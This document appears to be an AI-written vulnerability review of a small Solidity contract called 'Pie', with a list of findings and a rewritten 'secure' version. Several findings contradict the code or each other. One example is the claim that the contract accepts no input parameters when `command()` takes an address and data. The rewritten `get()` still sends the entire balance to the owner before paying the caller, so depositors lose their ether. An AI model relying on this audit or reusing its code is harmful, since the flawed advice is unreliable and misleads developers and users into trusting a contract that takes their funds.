Upon analyzing the provided smart contract, I have identified several vulnerabilities:

1. Reentrancy: This vulnerability occurs when a contract calls an external contract that can call back into the calling contract, reentering the same function before the first call completes. In the `Get()` function, the contract transfers the entire balance to the `msg.sender` before continuing execution. This allows an attacker to create a recursive call and drain the contract's balance.

2. Access Control: The `withdraw()` function allows anyone to call it and transfer the contract's balance to the `Owner` address. This means that anyone can become the owner and withdraw the funds.

3. Arithmetic Issues: There are no explicit arithmetic operations in the provided contract, so this vulnerability is not present.

4. Unchecked Return Values For Low-Level Calls: The `Command()` function allows the contract owner to call any address and execute arbitrary code. However, it does not check the return value of the external call, which could lead to silent failures if the called contract reverts or throws an exception.

5. Denial of Service: There are no explicit denial of service vulnerabilities in the contract.

6. Bad Randomness: There are no random number generation operations in the contract, so this vulnerability is not present.

7. Front-Running: There are no transactions or ordering dependencies in the contract, so this vulnerability is not present.

8. Time Manipulation: There are no timestamp dependencies in the contract, so this vulnerability is not present.

9. Short Address Attack: The contract does not accept any input parameters, so this vulnerability is not present.

To mitigate these vulnerabilities, the contract should be modified as follows:

1. Reentrancy: Use the "Checks-Effects-Interactions" pattern to handle external calls. Ensure that the contract's state is updated before making any external calls.

2. Access Control: Implement a proper access control mechanism to restrict the `withdraw()` function to only the designated owner.

3. Unchecked Return Values For Low-Level Calls: Check the return value of the external call and handle any failures or exceptions appropriately.

Here's an updated version of the contract with these vulnerabilities addressed:

```
pragma solidity ^0.4.19;

contract Pie {
    address public owner = msg.sender;
   
    function() public payable {}
   
    function get() public payable {
        require(msg.value > 1 ether);
        owner.transfer(this.balance);
        msg.sender.transfer(this.balance);
    }
    
    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }
    
    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}
```

Please note that this is just a basic example of addressing the vulnerabilities. Depending on the specific requirements and functionality of the contract, additional security measures may be necessary.
